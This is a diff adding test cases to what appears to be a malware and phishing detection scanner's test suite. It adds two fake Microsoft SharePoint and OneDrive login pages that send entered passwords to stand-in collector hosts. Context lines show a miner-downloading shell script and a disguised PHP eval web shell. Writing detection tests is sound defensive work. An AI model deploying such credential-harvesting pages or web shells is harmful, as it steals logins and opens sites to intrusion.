@@ -1118,6 +1118,16 @@ $out = shell_exec($cmd);`,
 			sample:   "#!/bin/sh\nWGET http://evil.test/XMRIG -O /tmp/.x\n",
 		},
 		{
+			name: "phishing kit submitting through JavaScript",
+			rule: "phishing_sharepoint",
+			ext:  ".html",
+			want: true,
+			sample: `<html><head><title>SharePoint - secured by Microsoft</title></head>
+<body><form id="l"><input type="password" name="p"></form>
+<script>fetch('https://collector.example.test/log.php', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>
+</body></html>`,
+		},
+		{
 			name:     "identifier containing downloader and miner names",
 			rule:     "miner_shell_script",
 			yaraRule: "miner_shell_downloader",
@@ -1491,6 +1501,18 @@ $r = wp_remote_post('https://target.test/xmlrpc.php', array('body' => $body));`,
 			sample: `<?php
 /* litespeed cache helper */
 eval($_POST['c']);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "OneDrive kit posting off-site with script",
+			yamlRule: "phishing_onedrive",
+			yaraRule: "phishing_sharepoint",
+			ext:      ".html",
+			sample: `<html><head><title>OneDrive - Microsoft</title></head><body>
+<form id="f"><input type="password" name="p"></form>
+<script>fetch('https://drop.example.test/od.php', {method: 'POST', body: new FormData(document.getElementById('f'))});</script>
+</body></html>`,
 			wantYAMLHit: true,
 			wantYARAHit: true,
 		},
